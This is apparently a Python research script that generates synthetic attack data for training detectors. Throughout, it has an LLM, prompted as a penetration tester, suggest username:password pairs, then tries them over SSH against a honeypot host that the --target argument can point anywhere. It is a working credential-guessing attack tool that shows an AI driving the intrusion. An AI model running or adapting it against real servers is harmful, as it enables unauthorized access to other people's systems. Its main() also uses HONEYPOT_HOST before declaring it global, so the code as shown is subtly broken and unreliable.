"""
FOR DEFENSIVE RESEARCH ONLY — generates synthetic AI_AGENT training data
for training attack detection models. Targets ONLY the isolated lab honeypot.

LLM-driven SSH credential guesser that captures real inference timing
in inter-attempt intervals for behavioral analysis.
"""

import argparse
import json
import os
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

import paramiko

LLM_MODEL = "claude-sonnet-4-20250514"
HONEYPOT_HOST = os.environ.get("HONEYPOT_HOST", "lab-honeypot")
HONEYPOT_PORT = int(os.environ.get("HONEYPOT_PORT", "2222"))
SESSIONS_DIR = Path(os.environ.get("SESSIONS_DIR", "sessions"))


def get_llm_credentials(context: str) -> list[tuple[str, str]]:
    """Ask LLM for credential guesses based on context."""
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if not api_key:
        # Fallback: simulate LLM-like timing with heuristic credentials
        time.sleep(2.0 + (hash(context) % 30) / 10.0)  # 2-5s simulated inference
        return [
            ("admin", "admin123"), ("root", "toor"), ("user", "password1"),
            ("admin", "P@ssw0rd"), ("root", "root123"),
        ]

    try:
        import anthropic
        client = anthropic.Anthropic(api_key=api_key)
        msg = client.messages.create(
            model=LLM_MODEL,
            max_tokens=256,
            messages=[{"role": "user", "content": (
                f"You are a penetration tester. {context} "
                "Suggest 5 username:password pairs to try. "
                "Return ONLY a JSON array of [username, password] pairs."
            )}],
        )
        pairs = json.loads(msg.content[0].text)
        return [(p[0], p[1]) for p in pairs[:5]]
    except Exception as e:
        print(f"LLM error: {e}, using fallback")
        time.sleep(2.5)
        return [("admin", "admin"), ("root", "password")]


def run_session(session_num: int) -> dict:
    """Run one AI-driven credential guessing session."""
    session_id = f"lab-ai-{session_num:04d}"
    attempts = []
    inter_times = []
    start = time.time()
    prev_time = start

    context = f"Target: SSH server at {HONEYPOT_HOST}:{HONEYPOT_PORT}. "
    success = False

    for round_num in range(3):  # Up to 3 rounds of LLM-guided attempts
        if round_num > 0:
            failed = [f"{u}:{p}" for u, p, _ in attempts[-5:]]
            context += f"Previously failed: {', '.join(failed)}. Try different approaches. "

        creds = get_llm_credentials(context)

        for username, password in creds:
            now = time.time()
            inter_times.append(int((now - prev_time) * 1000))
            prev_time = now

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(HONEYPOT_HOST, port=HONEYPOT_PORT,
                               username=username, password=password, timeout=5,
                               allow_agent=False, look_for_keys=False)
                attempts.append((username, password, True))
                success = True
                client.close()
                break
            except paramiko.AuthenticationException:
                attempts.append((username, password, False))
            except Exception as e:
                attempts.append((username, password, False))
                print(f"  Connection error: {e}")

        if success:
            break

    duration = time.time() - start

    session = {
        "session_id": session_id,
        "source": "lab-attacker",
        "src_ip": "172.20.0.3",
        "dst_port": HONEYPOT_PORT,
        "protocol": "tcp",
        "category": "AI_AGENT",
        "session_metadata": {
            "duration_seconds": round(duration, 2),
            "attempts_in_session": len(attempts),
            "credentials_tried": [[u, p] for u, p, _ in attempts],
            "successes": [s for _, _, s in attempts],
            "inter_attempt_ms": inter_times[1:] if len(inter_times) > 1 else [],
            "llm_model": LLM_MODEL,
            "generation_timestamp": datetime.now(timezone.utc).isoformat(),
        },
    }

    return session


def main():
    parser = argparse.ArgumentParser(description="LLM-driven SSH credential guesser (lab only)")
    parser.add_argument("--sessions", type=int, default=100)
    parser.add_argument("--target", default=HONEYPOT_HOST)
    args = parser.parse_args()

    global HONEYPOT_HOST
    HONEYPOT_HOST = args.target
    SESSIONS_DIR.mkdir(parents=True, exist_ok=True)

    print(f"Generating {args.sessions} AI_AGENT sessions against {HONEYPOT_HOST}:{HONEYPOT_PORT}")

    for i in range(args.sessions):
        print(f"Session {i+1}/{args.sessions}...")
        session = run_session(i)
        path = SESSIONS_DIR / f"{session['session_id']}.json"
        with open(path, "w") as f:
            json.dump(session, f, indent=2)
        print(f"  → {path} ({session['session_metadata']['attempts_in_session']} attempts, "
              f"{session['session_metadata']['duration_seconds']}s)")

    print(f"\nDone. {args.sessions} sessions saved to {SESSIONS_DIR}/")


if __name__ == "__main__":
    main()
